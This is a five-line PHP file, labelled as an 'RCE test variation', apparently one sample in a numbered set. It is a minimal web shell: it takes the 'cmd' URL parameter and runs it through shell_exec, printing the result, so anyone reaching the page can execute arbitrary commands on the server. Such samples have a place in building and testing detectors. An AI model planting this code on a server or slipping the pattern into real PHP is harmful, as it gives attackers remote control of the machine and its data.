<?php
// RCE test variation #1096
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>